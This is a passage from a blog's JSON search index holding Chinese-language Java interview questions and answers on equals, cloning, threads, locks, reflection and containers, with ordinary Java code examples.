一","uri":"/posts/java%E5%9F%BA%E7%A1%80-%E4%B8%80/"},{"categories":["java面试"],"content":"Java基础 1.JDK 和 JRE 有什么区别？ JDK：Java Development Kit 的简称，java 开发工具包，提供了 java 的开发环境和运行环境。 JRE：Java Runtime Environment 的简称，java 运行环境，为 java 的运行提供了所需环境。 具体来说 JDK 其实包含了 JRE，同时还包含了编译 java 源码的编译器 javac，还包含了很多 java 程序调试和分析的工具。简单来说：如果你需要运行 java 程序，只需安装 JRE 就可以了，如果你需要编写 java 程序，需要安装 JDK。 2.== 和 equals 的区别是什么？ == 解读 对于基本类型和引用类型 == 的作用效果是不同的，如下所示： 基本类型：比较的是值是否相同； 引用类型：比较的是引用是否相同； 代码示例： `String x = \"string\"; String y = \"string\"; String z = new String(\"string\"); System.out.println(x==y); // true System.out.println(x==z); // false System.out.println(x.equals(y)); // true System.out.println(x.equals(z)); // true` 代码解读：因为 x 和 y 指向的是同一个引用，所以 == 也是 true，而 new String()方法则重写开辟了内存空间，所以 == 结果为 false，而 equals 比较的一直是值，所以结果都为 true。 equals 解读 equals 本质上就是 ==，只不过 String 和 Integer 等重写了 equals 方法，把它变成了值比较。看下面的代码就明白了。 首先来看默认情况下 equals 比较一个有相同值的对象，代码如下： `class Cat { public Cat(String name) { this.name = name; } private String name; public String getName() { return name; } public void setName(String name) { this.name = name; } } Cat c1 = new Cat(\"王磊\"); Cat c2 = new Cat(\"王磊\"); System.out.println(c1.equals(c2)); // false` 输出结果出乎我们的意料，竟然是 false？这是怎么回事，看了 equals 源码就知道了，源码如下： `public boolean equals(Object obj) { return (this == obj); }` 原来 equals 本质上就是 ==。 那问题来了，两个相同值的 String 对象，为什么返回的是 true？代码如下： `String s1 = new String(\"老王\"); String s2 = new String(\"老王\"); System.out.println(s1.equals(s2)); // true` 同样的，当我们进入 String 的 equals 方法，找到了答案，代码如下： `public boolean equals(Object anObject) { if (this == anObject) { return true; } if (anObject instanceof String) { String anotherString = (String)anObject; int n = value.length; if (n == anotherString.value.length) { char v1[] = value; char v2[] = anotherString.value; int i = 0; while (n-- != 0) { if (v1[i] != v2[i]) return false; i++; } return true; } } return false; }` 原来是 String 重写了 Object 的 equals 方法，把引用比较改成了值比较。 总结 ：== 对于基本类型来说是值比较，对于引用类型来说是比较的是引用；而 equals 默认情况下是引用比较，只是很多类重写了 equals 方法，比如 String、Integer 等把它变成了值比较，所以一般情况下 equals 比较的是值是否相等。 3.两个对象的 hashCode()相同，则 ","date":"2021-07-19","objectID":"/posts/java%E5%9F%BA%E7%A1%80-%E4%B8%80/:1:0","tags":[],"title":"Java基础 一","uri":"/posts/java%E5%9F%BA%E7%A1%80-%E4%B8%80/"},{"categories":["java面试"],"content":" 本文由 简悦 SimpRead 转码， 原文地址 blog.csdn.net ","date":"2021-07-19","objectID":"/posts/%E5%AF%B9%E8%B1%A1%E6%8B%B7%E8%B4%9D-%E4%BA%94/:0:0","tags":["对象拷贝"],"title":"对象拷贝 五","uri":"/posts/%E5%AF%B9%E8%B1%A1%E6%8B%B7%E8%B4%9D-%E4%BA%94/"},{"categories":["java面试"],"content":"对象拷贝 ","date":"2021-07-19","objectID":"/posts/%E5%AF%B9%E8%B1%A1%E6%8B%B7%E8%B4%9D-%E4%BA%94/:1:0","tags":["对象拷贝"],"title":"对象拷贝 五","uri":"/posts/%E5%AF%B9%E8%B1%A1%E6%8B%B7%E8%B4%9D-%E4%BA%94/"},{"categories":["java面试"],"content":"61. 为什么要使用克隆？ 想对一个对象进行处理，又想保留原有的数据进行接下来的操作，就需要克隆了，Java语言中克隆针对的是类的实例。 ","date":"2021-07-19","objectID":"/posts/%E5%AF%B9%E8%B1%A1%E6%8B%B7%E8%B4%9D-%E4%BA%94/:1:1","tags":["对象拷贝"],"title":"对象拷贝 五","uri":"/posts/%E5%AF%B9%E8%B1%A1%E6%8B%B7%E8%B4%9D-%E4%BA%94/"},{"categories":["java面试"],"content":"62. 如何实现对象克隆？ 有两种方式： 实现Cloneable接口并重写Object类中的clone()方法； 实现Serializable接口，通过对象的序列化和反序列化实现克隆，可以实现真正的深度克隆，代码如下： `import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.Serializable; public class MyUtil { private MyUtil() { throw new AssertionError(); } @SuppressWarnings(\"unchecked\") public static \u003cT extends Serializable\u003e T clone(T obj) throws Exception { ByteArrayOutputStream bout = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bout); oos.writeObject(obj); ByteArrayInputStream bin = new ByteArrayInputStream(bout.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bin); return (T) ois.readObject(); // 说明：调用ByteArrayInputStream或ByteArrayOutputStream对象的close方法没有任何意义 // 这两个基于内存的流只要垃圾回收器清理对象就能够释放资源，这一点不同于对外部资源（如文件流）的释放 } }` 下面是测试代码： `import java.io.Serializable; /** * 人类 * @author nnngu * */ class Person implements Serializable { private static final long serialVersionUID = -9102017020286042305L; private String name; // 姓名 private int age; // 年龄 private Car car; // 座驾 public Person(String name, int age, Car car) { this.name = name; this.age = age; this.car = car; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } public Car getCar() { return car; } public void setCar(Car car) { this.car = car; } @Override public String toString() { return \"Person []\"; } }` `/** * 小汽车类 * @author nnngu * */ class Car implements Serializable { private static final long serialVersionUID = -5713945027627603702L; private String brand; // 品牌 private int maxSpeed; // 最高时速 public Car(String brand, int maxSpeed) { this.brand = brand; this.maxSpeed = maxSpeed; } public String getBrand() { return brand; } public void setBrand(String brand) { this.brand = brand; } public int getMaxSpeed() { return maxSpeed; } public void setMaxSpee","date":"2021-07-19","objectID":"/posts/%E5%AF%B9%E8%B1%A1%E6%8B%B7%E8%B4%9D-%E4%BA%94/:1:2","tags":["对象拷贝"],"title":"对象拷贝 五","uri":"/posts/%E5%AF%B9%E8%B1%A1%E6%8B%B7%E8%B4%9D-%E4%BA%94/"},{"categories":["java面试"],"content":"63. 深拷贝和浅拷贝区别是什么？ 浅拷贝只是复制了对象的引用地址，两个对象指向同一个内存地址，所以修改其中任意的值，另一个值都会随之变化，这就是浅拷贝（例：assign()） 深拷贝是将对象及值复制过来，两个对象修改其中任意的值另一个值不会改变，这就是深拷贝（例：JSON.parse()和JSON.stringify()，但是此方法无法复制函数类型） 转载自：https://mp.weixin.qq.com/s/0KM4e3_zPczHh2TH2r_ncA ","date":"2021-07-19","objectID":"/posts/%E5%AF%B9%E8%B1%A1%E6%8B%B7%E8%B4%9D-%E4%BA%94/:1:3","tags":["对象拷贝"],"title":"对象拷贝 五","uri":"/posts/%E5%AF%B9%E8%B1%A1%E6%8B%B7%E8%B4%9D-%E4%BA%94/"},{"categories":["java面试"],"content":" 本文由 简悦 SimpRead 转码， 原文地址 blog.csdn.net ","date":"2021-07-19","objectID":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/:0:0","tags":["多线程"],"title":"多线程 三","uri":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/"},{"categories":["java面试"],"content":"Java 208 道面试题 · 多线程 ","date":"2021-07-19","objectID":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/:1:0","tags":["多线程"],"title":"多线程 三","uri":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/"},{"categories":["java面试"],"content":"35. 并行和并发有什么区别？ 并行是指两个或者多个事件在同一时刻发生；而并发是指两个或多个事件在同一时间间隔发生。 并行是在不同实体上的多个事件，并发是在同一实体上的多个事件。 在一台处理器上“同时”处理多个任务，在多台处理器上同时处理多个任务。如hadoop分布式集群。 所以并发编程的目标是充分的利用处理器的每一个核，以达到最高的处理性能。 ","date":"2021-07-19","objectID":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/:1:1","tags":["多线程"],"title":"多线程 三","uri":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/"},{"categories":["java面试"],"content":"36. 线程和进程的区别？ 简而言之，进程是程序运行和资源分配的基本单位，一个程序至少有一个进程，一个进程至少有一个线程。进程在执行过程中拥有独立的内存单元，而多个线程共享内存资源，减少切换次数，从而效率更高。线程是进程的一个实体，是cpu调度和分派的基本单位，是比程序更小的能独立运行的基本单位。同一进程中的多个线程之间可以并发执行。 ","date":"2021-07-19","objectID":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/:1:2","tags":["多线程"],"title":"多线程 三","uri":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/"},{"categories":["java面试"],"content":"37. 守护线程是什么？ 守护线程（即daemon thread），是个服务线程，准确地来说就是服务其他的线程。 ","date":"2021-07-19","objectID":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/:1:3","tags":["多线程"],"title":"多线程 三","uri":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/"},{"categories":["java面试"],"content":"38. 创建线程有哪几种方式？ ①. 继承Thread类创建线程类 定义Thread类的子类，并重写该类的run方法，该run方法的方法体就代表了线程要完成的任务。因此把run()方法称为执行体。 创建Thread子类的实例，即创建了线程对象。 调用线程对象的start()方法来启动该线程。 public class ThreadTest extends Thread { public static void main(String[] args){ new Thread(){ @Override public void run() { System.out.println(\"重写Thread类run方法\"); } }.start(); new ThreadTest().start(); } @Override public void run() { super.run(); System.out.println(\"执行thread01线程\"); } } 执行thread01线程 重写Thread类run方法 Process finished with exit code 0 ②. 通过Runnable接口创建线程类 定义runnable接口的实现类，并重写该接口的run()方法，该run()方法的方法体同样是该线程的线程执行体。 创建 Runnable实现类的实例，并依此实例作为Thread的target来创建Thread对象，该Thread对象才是真正的线程对象。 调用线程对象的start()方法来启动该线程。 public class RunnableTest implements Runnable { public static void main(String[] args){ new Thread(new RunnableTest()).start(); } @Override public void run() { System.out.println(\"这是一个Callable接口的具体实现类，没有有返回值哦\"); } } ③. 通过Callable和Future创建线程 创建Callable接口的实现类，并实现call()方法，该call()方法将作为线程执行体，并且有返回值。 创建Callable实现类的实例，使用FutureTask类来包装Callable对象，该FutureTask对象封装了该Callable对象的call()方法的返回值。 使用FutureTask对象作为Thread对象的target创建并启动新线程。 调用FutureTask对象的get()方法来获得子线程执行结束后的返回值。 public class CallableAndFuture implements Callable { @Override public Object call() throws Exception { return \"通过CallAble和Future创建线程\"; } public static void main(String[] args) throws ExecutionException, InterruptedException { Callable c1=new CallableAndFuture(); FutureTask futureTask=new FutureTask(c1); Thread thread=new Thread(futureTask); thread.start(); System.out.println(futureTask.get()); } } ","date":"2021-07-19","objectID":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/:1:4","tags":["多线程"],"title":"多线程 三","uri":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/"},{"categories":["java面试"],"content":"39. 说一下 runnable 和 callable 有什么区别？ 有点深的问题了，也看出一个Java程序员学习知识的广度。 Runnable接口中的run()方法的返回值是void，它做的事情只是纯粹地去执行run()方法中的代码而已； Callable接口中的call()方法是有返回值的，是一个泛型，和Future、FutureTask配合可以用来获取异步执行的结果。 ","date":"2021-07-19","objectID":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/:1:5","tags":["多线程"],"title":"多线程 三","uri":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/"},{"categories":["java面试"],"content":"40. 线程有哪些状态？ 线程通常都有五种状态，创建、就绪、运行、阻塞和死亡。 创建状态。在生成线程对象，并没有调用该对象的start方法，这是线程处于创建状态。 就绪状态。当调用了线程对象的start方法之后，该线程就进入了就绪状态，但是此时线程调度程序还没有把该线程设置为当前线程，此时处于就绪状态。在线程运行之后，从等待或者睡眠中回来之后，也会处于就绪状态。 运行状态。线程调度程序将处于就绪状态的线程设置为当前线程，此时线程就进入了运行状态，开始运行run函数当中的代码。 阻塞状态。线程正在运行的时候，被暂停，通常是为了等待某个时间的发生(比如说某项资源就绪)之后再继续运行。sleep,suspend，wait等方法都可以导致线程阻塞。 死亡状态。如果一个线程的run方法执行结束或者调用stop方法后，该线程就会死亡。对于已经死亡的线程，无法再使用start方法令其进入就绪 ","date":"2021-07-19","objectID":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/:1:6","tags":["多线程"],"title":"多线程 三","uri":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/"},{"categories":["java面试"],"content":"41. sleep() 和 wait() 有什么区别？ sleep()：方法是线程类（Thread）的静态方法，让调用线程进入睡眠状态，让出执行机会给其他线程，等到休眠时间结束后，线程进入就绪状态和其他线程一起竞争cpu的执行时间。因为sleep() 是static静态的方法，他不能改变对象的机锁，当一个synchronized块中调用了sleep() 方法，线程虽然进入休眠，但是对象的机锁没有被释放，其他线程依然无法访问这个对象。 wait()：wait()是Object类的方法，当一个线程执行到wait方法时，它就进入到一个和该对象相关的等待池，同时释放对象的机锁，使得其他线程能够访问，可以通过notify，notifyAll方法来唤醒等待的线程 ","date":"2021-07-19","objectID":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/:1:7","tags":["多线程"],"title":"多线程 三","uri":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/"},{"categories":["java面试"],"content":"42. notify()和 notifyAll()有什么区别？ 如果线程调用了对象的 wait()方法，那么线程便会处于该对象的等待池中，等待池中的线程不会去竞争该对象的锁。 当有线程调用了对象的 notifyAll()方法（唤醒所有 wait 线程）或 notify()方法（只随机唤醒一个 wait 线程），被唤醒的的线程便会进入该对象的锁池中，锁池中的线程会去竞争该对象锁。也就是说，调用了notify后只要一个线程会由等待池进入锁池，而notifyAll会将该对象等待池内的所有线程移动到锁池中，等待锁竞争。 优先级高的线程竞争到对象锁的概率大，假若某线程没有竞争到该对象锁，它还会留在锁池中，唯有线程再次调用 wait()方法，它才会重新回到等待池中。而竞争到对象锁的线程则继续往下执行，直到执行完了 synchronized 代码块，它会释放掉该对象锁，这时锁池中的线程会继续竞争该对象锁。 ","date":"2021-07-19","objectID":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/:1:8","tags":["多线程"],"title":"多线程 三","uri":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/"},{"categories":["java面试"],"content":"43. 线程的 run()和 start()有什么区别？ 每个线程都是通过某个特定Thread对象所对应的方法run()来完成其操作的，方法run()称为线程体。通过调用Thread类的start()方法来启动一个线程。 start()方法来启动一个线程，真正实现了多线程运行。这时无需等待run方法体代码执行完毕，可以直接继续执行下面的代码； 这时此线程是处于就绪状态， 并没有运行。 然后通过此Thread类调用方法run()来完成其运行状态， 这里方法run()称为线程体，它包含了要执行的这个线程的内容， Run方法运行结束， 此线程终止。然后CPU再调度其它线程。 run()方法是在本线程里的，只是线程里的一个函数,而不是多线程的。 如果直接调用run(),其实就相当于是调用了一个普通函数而已，直接待用run()方法必须等待run()方法执行完毕才能执行下面的代码，所以执行路径还是只有一条，根本就没有线程的特征，所以在多线程执行时要使用start()方法而不是run()方法。 ","date":"2021-07-19","objectID":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/:1:9","tags":["多线程"],"title":"多线程 三","uri":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/"},{"categories":["java面试"],"content":"44. 创建线程池有哪几种方式？ ①. newFixedThreadPool(int nThreads) 创建一个固定长度的线程池，每当提交一个任务就创建一个线程，直到达到线程池的最大数量，这时线程规模将不再变化，当线程发生未预期的错误而结束时，线程池会补充一个新的线程。 ②. newCachedThreadPool() 创建一个可缓存的线程池，如果线程池的规模超过了处理需求，将自动回收空闲线程，而当需求增加时，则可以自动添加新线程，线程池的规模不存在任何限制。 ③. newSingleThreadExecutor() 这是一个单线程的Executor，它创建单个工作线程来执行任务，如果这个线程异常结束，会创建一个新的来替代它；它的特点是能确保依照任务在队列中的顺序来串行执行。 ④. newScheduledThreadPool(int corePoolSize) 创建了一个固定长度的线程池，而且以延迟或定时的方式来执行任务，类似于Timer。 ","date":"2021-07-19","objectID":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/:1:10","tags":["多线程"],"title":"多线程 三","uri":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/"},{"categories":["java面试"],"content":"45. 线程池都有哪些状态？ 线程池有5种状态：Running、ShutDown、Stop、Tidying、Terminated。 线程池各个状态切换框架图： 详细解释见:Java多线程线程池（4）–线程池的五种状态 ","date":"2021-07-19","objectID":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/:1:11","tags":["多线程"],"title":"多线程 三","uri":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/"},{"categories":["java面试"],"content":"46. 线程池中 submit()和 execute()方法有什么区别？ 接收的参数不一样 submit有返回值，而execute没有 submit方便Exception处理 ","date":"2021-07-19","objectID":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/:1:12","tags":["多线程"],"title":"多线程 三","uri":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/"},{"categories":["java面试"],"content":"47. 在 java 程序中怎么保证多线程的运行安全？ 线程安全在三个方面体现： 原子性：提供互斥访问，同一时刻只能有一个线程对数据进行操作，（atomic,synchronized）； 可见性：一个线程对主内存的修改可以及时地被其他线程看到，（synchronized,volatile）； 有序性：一个线程观察其他线程中的指令执行顺序，由于指令重排序，该观察结果一般杂乱无序，（happens-before原则）。 ","date":"2021-07-19","objectID":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/:1:13","tags":["多线程"],"title":"多线程 三","uri":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/"},{"categories":["java面试"],"content":"48. 多线程锁的升级原理是什么？ 在Java中，锁共有4种状态，级别从低到高依次为：无状态锁，偏向锁，轻量级锁和重量级锁状态，这几个状态会随着竞争情况逐渐升级。锁可以升级但不能降级。 锁升级的图示过程： 锁共有4种状态详解: 【Java多线程策略 一】锁的三种状态切换 ","date":"2021-07-19","objectID":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/:1:14","tags":["多线程"],"title":"多线程 三","uri":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/"},{"categories":["java面试"],"content":"49. 什么是死锁？ 死锁是指两个或两个以上的进程在执行过程中，由于竞争资源或者由于彼此通信而造成的一种阻塞的现象，若无外力作用，它们都将无法推进下去。此时称系统处于死锁状态或系统产生了死锁，这些永远在互相等待的进程称为死锁进程。是操作系统层面的一个错误，是进程死锁的简称，最早在 1965 年由 Dijkstra 在研究银行家算法时提出的，它是计算机操作系统乃至整个并发程序设计领域最难处理的问题之一。 ","date":"2021-07-19","objectID":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/:1:15","tags":["多线程"],"title":"多线程 三","uri":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/"},{"categories":["java面试"],"content":"50. 怎么防止死锁？ 死锁的四个必要条件： 互斥条件：进程对所分配到的资源不允许其他进程进行访问，若其他进程访问该资源，只能等待，直至占有该资源的进程使用完成后释放该资源 请求和保持条件：进程获得一定的资源之后，又对其他资源发出请求，但是该资源可能被其他进程占有，此事请求阻塞，但又对自己获得的资源保持不放 不可剥夺条件：是指进程已获得的资源，在未完成使用之前，不可被剥夺，只能在使用完后自己释放 环路等待条件：是指进程发生死锁后，若干进程之间形成一种头尾相接的循环等待资源关系 这四个条件是死锁的必要条件，只要系统发生死锁，这些条件必然成立，而只要上述条件之 一不满足，就不会发生死锁。 理解了死锁的原因，尤其是产生死锁的四个必要条件，就可以最大可能地避免、预防和 解除死锁。 所以，在系统设计、进程调度等方面注意如何不让这四个必要条件成立，如何确 定资源的合理分配算法，避免进程永久占据系统资源。 此外，也要防止进程在处于等待状态的情况下占用资源。因此，对资源的分配要给予合理的规划。 ","date":"2021-07-19","objectID":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/:1:16","tags":["多线程"],"title":"多线程 三","uri":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/"},{"categories":["java面试"],"content":"51. ThreadLocal 是什么？有哪些使用场景？ 线程局部变量是局限于线程内部的变量，属于线程自身所有，不在多个线程间共享。Java提供ThreadLocal类来支持线程局部变量，是一种实现线程安全的方式。但是在管理环境下（如 web 服务器）使用线程局部变量的时候要特别小心，在这种情况下，工作线程的生命周期比任何应用变量的生命周期都要长。任何线程局部变量一旦在工作完成后没有释放，Java 应用就存在内存泄露的风险。 ","date":"2021-07-19","objectID":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/:1:17","tags":["多线程"],"title":"多线程 三","uri":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/"},{"categories":["java面试"],"content":"52.说一下 synchronized 底层实现原理？ synchronized可以保证方法或者代码块在运行时，同一时刻只有一个方法可以进入到临界区，同时它还可以保证共享变量的内存可见性。 Java中每一个对象都可以作为锁，这是synchronized实现同步的基础： 普通同步方法，锁是当前实例对象 静态同步方法，锁是当前类的class对象 同步方法块，锁是括号里面的对象 ","date":"2021-07-19","objectID":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/:1:18","tags":["多线程"],"title":"多线程 三","uri":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/"},{"categories":["java面试"],"content":"53. synchronized 和 volatile 的区别是什么？ volatile本质是在告诉jvm当前变量在寄存器（工作内存）中的值是不确定的，需要从主存中读取； synchronized则是锁定当前变量，只有当前线程可以访问该变量，其他线程被阻塞住。 volatile仅能使用在变量级别；synchronized则可以使用在变量、方法、和类级别的。 volatile仅能实现变量的修改可见性，不能保证原子性；而synchronized则可以保证变量的修改可见性和原子性。 volatile不会造成线程的阻塞；synchronized可能会造成线程的阻塞。 volatile标记的变量不会被编译器优化；synchronized标记的变量可以被编译器优化。 ","date":"2021-07-19","objectID":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/:1:19","tags":["多线程"],"title":"多线程 三","uri":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/"},{"categories":["java面试"],"content":"54. synchronized 和3 Lock 有什么区别？ 首先synchronized是java内置关键字，在jvm层面，Lock是个java类； synchronized无法判断是否获取锁的状态，Lock可以判断是否获取到锁； synchronized会自动释放锁(a 线程执行完同步代码会释放锁 ；b 线程执行过程中发生异常会释放锁)，Lock需在finally中手工释放锁（unlock()方法释放锁），否则容易造成线程死锁； 用synchronized关键字的两个线程1和线程2，如果当前线程1获得锁，线程2线程等待。如果线程1阻塞，线程2则会一直等待下去，而Lock锁就不一定会等待下去，如果尝试获取不到锁，线程可以不用一直等待就结束了； synchronized的锁可重入、不可中断、非公平，而Lock锁可重入、可判断、可公平（两者皆可）； Lock锁适合大量同步的代码的同步问题，synchronized锁适合代码少量的同步问题。 ","date":"2021-07-19","objectID":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/:1:20","tags":["多线程"],"title":"多线程 三","uri":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/"},{"categories":["java面试"],"content":"55. synchronized 和 ReentrantLock 区别是什么？ synchronized是和if、else、for、while一样的关键字，ReentrantLock是类，这是二者的本质区别。既然ReentrantLock是类，那么它就提供了比synchronized更多更灵活的特性，可以被继承、可以有方法、可以有各种各样的类变量，ReentrantLock比synchronized的扩展性体现在几点上： ReentrantLock可以对获取锁的等待时间进行设置，这样就避免了死锁 ReentrantLock可以获取各种锁的信息 ReentrantLock可以灵活地实现多路通知 另外，二者的锁机制其实也是不一样的:ReentrantLock底层调用的是Unsafe的park方法加锁，synchronized操作的应该是对象头中mark word。 ","date":"2021-07-19","objectID":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/:1:21","tags":["多线程"],"title":"多线程 三","uri":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/"},{"categories":["java面试"],"content":"56. 说一下 atomic 的原理？ Atomic包中的类基本的特性就是在多线程环境下，当有多个线程同时对单个（包括基本类型及引用类型）变量进行操作时，具有排他性，即当多个线程同时对该变量的值进行更新时，仅有一个线程能成功，而未成功的线程可以向自旋锁一样，继续尝试，一直等到执行成功。 Atomic系列的类中的核心方法都会调用unsafe类中的几个本地方法。我们需要先知道一个东西就是Unsafe类，全名为：sun.misc.Unsafe，这个类包含了大量的对C代码的操作，包括很多直接内存分配以及原子操作的调用，而它之所以标记为非安全的，是告诉你这个里面大量的方法调用都会存在安全隐患，需要小心使用，否则会导致严重的后果，例如在通过unsafe分配内存的时候，如果自己指定某些区域可能会导致一些类似C++一样的指针越界到其他进程的问题。 原文地址:https://blog.csdn.net/sufu1065/article/details/88051083 ","date":"2021-07-19","objectID":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/:1:22","tags":["多线程"],"title":"多线程 三","uri":"/posts/%E5%A4%9A%E7%BA%BF%E7%A8%8B-%E4%B8%89/"},{"categories":["java面试"],"content":" 本文由 简悦 SimpRead 转码， 原文地址 blog.csdn.net ","date":"2021-07-19","objectID":"/posts/%E5%8F%8D%E5%B0%84-%E5%9B%9B/:0:0","tags":["反射"],"title":"反射 四","uri":"/posts/%E5%8F%8D%E5%B0%84-%E5%9B%9B/"},{"categories":["java面试"],"content":"Java 208 道面试题 · 反射 ","date":"2021-07-19","objectID":"/posts/%E5%8F%8D%E5%B0%84-%E5%9B%9B/:1:0","tags":["反射"],"title":"反射 四","uri":"/posts/%E5%8F%8D%E5%B0%84-%E5%9B%9B/"},{"categories":["java面试"],"content":"57. 什么是反射？ 反射主要是指程序可以访问、检测和修改它本身状态或行为的一种能力 Java反射： 在Java运行时环境中，对于任意一个类，能否知道这个类有哪些属性和方法？对于任意一个对象，能否调用它的任意一个方法 Java反射机制主要提供了以下功能： 在运行时判断任意一个对象所属的类。 在运行时构造任意一个类的对象。 在运行时判断任意一个类所具有的成员变量和方法。 在运行时调用任意一个对象的方法。 ","date":"2021-07-19","objectID":"/posts/%E5%8F%8D%E5%B0%84-%E5%9B%9B/:1:1","tags":["反射"],"title":"反射 四","uri":"/posts/%E5%8F%8D%E5%B0%84-%E5%9B%9B/"},{"categories":["java面试"],"content":"58. 什么是 java 序列化？什么情况下需要序列化？ 简单说就是为了保存在内存中的各种对象的状态（也就是实例变量，不是方法），并且可以把保存的对象状态再读出来。虽然你可以用你自己的各种各样的方法来保存object states，但是Java给你提供一种应该比你自己好的保存对象状态的机制，那就是序列化。 什么情况下需要序列化： a）当你想把的内存中的对象状态保存到一个文件中或者数据库中时候； b）当你想用套接字在网络上传送对象的时候； c）当你想通过RMI传输对象的时候； ","date":"2021-07-19","objectID":"/posts/%E5%8F%8D%E5%B0%84-%E5%9B%9B/:1:2","tags":["反射"],"title":"反射 四","uri":"/posts/%E5%8F%8D%E5%B0%84-%E5%9B%9B/"},{"categories":["java面试"],"content":"59. 动态代理是什么？有哪些应用？ 动态代理： 当想要给实现了某个接口的类中的方法，加一些额外的处理。比如说加日志，加事务等。可以给这个类创建一个代理，故名思议就是创建一个新的类，这个类不仅包含原来类方法的功能，而且还在原来的基础上添加了额外处理的新类。这个代理类并不是定义好的，是动态生成的。具有解耦意义，灵活，扩展性强。 动代理的应用： Spring的AOP 加事务 加权限 加日志 ","date":"2021-07-19","objectID":"/posts/%E5%8F%8D%E5%B0%84-%E5%9B%9B/:1:3","tags":["反射"],"title":"反射 四","uri":"/posts/%E5%8F%8D%E5%B0%84-%E5%9B%9B/"},{"categories":["java面试"],"content":"60. 怎么实现动态代理？ 首先必须定义一个接口，还要有一个InvocationHandler(将实现接口的类的对象传递给它)处理类。再有一个工具类Proxy(习惯性将其称为代理类，因为调用他的newInstance()可以产生代理对象,其实他只是一个产生代理对象的工具类）。利用到InvocationHandler，拼接代理类源码，将其编译生成代理类的二进制码，利用加载器加载，并将其实例化产生代理对象，最后返回。 原文地址：https://blog.csdn.net/sufu1065/article/details/88051083 ","date":"2021-07-19","objectID":"/posts/%E5%8F%8D%E5%B0%84-%E5%9B%9B/:1:4","tags":["反射"],"title":"反射 四","uri":"/posts/%E5%8F%8D%E5%B0%84-%E5%9B%9B/"},{"categories":["java面试"],"content":" 本文由 简悦 SimpRead 转码， 原文地址 blog.csdn.net ","date":"2021-07-19","objectID":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/:0:0","tags":["java容器"],"title":"容器 二","uri":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/"},{"categories":["java面试"],"content":"Java 208 道面试题 · 容器 ","date":"2021-07-19","objectID":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/:1:0","tags":["java容器"],"title":"容器 二","uri":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/"},{"categories":["java面试"],"content":"18. java 容器都有哪些？ 常用容器的图录： ","date":"2021-07-19","objectID":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/:1:1","tags":["java容器"],"title":"容器 二","uri":"/posts/%E5%AE%B9%E5%99%A8-%E4%BA%8C/"},{"categories":["java面试"],"content":"19. Collection 和 Collections 